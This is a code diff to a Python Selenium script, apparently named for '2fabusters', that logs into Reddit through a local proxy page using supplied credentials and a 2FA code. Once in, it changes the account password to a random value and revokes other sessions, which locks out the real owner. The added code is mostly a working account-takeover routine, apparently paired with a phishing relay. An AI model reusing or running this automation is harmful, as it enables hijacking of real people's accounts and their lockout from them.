@@ -11,10 +11,16 @@ import os
 import sys
 import platform
 import time
+import uuid
 
-
+# constants
 ADDRESS = 'http://127.0.0.1:8000/'
 TITLE_TO_MATCH = "reddit: the front page of the internet"
+INVALID_CREDS = -1
+SUCCESS_NO_TWOAUTH = 0
+SUCCESS_TWOAUTH = 1
+
+# globals
 driver = None
 
 # Setup the headless browser with Gecko for Firefox and open reddit's login page
@@ -41,15 +47,19 @@ def do_login(**credentials):
     submit_btn = driver.find_element_by_class_name("AnimatedForm__submitButton")
     submit_btn.click()
 
-    # Is the 2FA page showing up?
+    # Which page is showing up?
     while True:
         length_error = len(driver.find_elements_by_class_name('m-error'))
         length_twofa = len(driver.find_elements_by_class_name('mode-2fa'))
+        length_notwofa = len(driver.find_elements_by_class_name('m-success'))
         if length_error > 0:
-            return False # creds were not correct
+            return INVALID_CREDS # creds were not correct
         if length_twofa > 0:
-            return True # creds were valid
-
+            return SUCCESS_TWOAUTH # creds were valid and auth page presented
+        if length_notwofa > 0:
+            print("logged in, no twoauth")
+            return SUCCESS_NO_TWOAUTH # successfully logged in without two auth
+        
 
 # returns -1 if login failed due to invalid auth or other error
 # 0 upon login success only
@@ -86,20 +96,38 @@ def do_twoauth(code):
 
 
 # Change the password! New password will be returned, or 0 if error.
-def do_password_change():
-    driver.get("https://www.reddit.com/settings/account")
-    change_pwd_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'cIQFwt')))    
-    change_pwd_button.click()
+def do_password_change(old_password):
+    driver.get("https://www.reddit.com/prefs/update")
+    temp_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'emailverification-edit')))
+    temp_button.send_keys(Keys.TAB)
+    current_password_field = driver.switch_to.active_element
+    current_password_field.send_keys(old_password)
+    new_password = str(uuid.uuid4().hex)
+    driver.find_element_by_name('newpass').send_keys(new_password)
+    driver.find_element_by_name('verpass').send_keys(new_password)
+    deauth_checkbox = driver.find_element_by_id('invalidate_oauth')
+    deauth_checkbox.click()
+    deauth_checkbox.send_keys(Keys.TAB)
+    save_button = driver.switch_to.active_element
+    save_button.click()
+    return new_password
+    
 
 
 def go():
     setup()
-    cred_correct = do_login(Username="2fabusters", Password="attackatdawn")
+    cred_status = do_login(Username="2fabusters", Password="attackatdawn")
     twoauth_correct = False
-    if cred_correct:
-        twoauth_correct = do_twoauth("815720")
-    if twoauth_correct:
-        pass
+    if cred_status == SUCCESS_TWOAUTH:
+        print("login good; trying twoauth")
+        twoauth_correct = do_twoauth("000000")
+        if twoauth_correct:
+            new_password = do_password_change("attackatdawn")
+            print("new password: " + new_password)
+    elif cred_status == SUCCESS_NO_TWOAUTH:
+        print("no twoauth, we're in. Time to change password")
+        new_password = do_password_change("attackatdawn")
+        print("new password: " + new_password)
 
 if __name__ == '__main__':
     go()
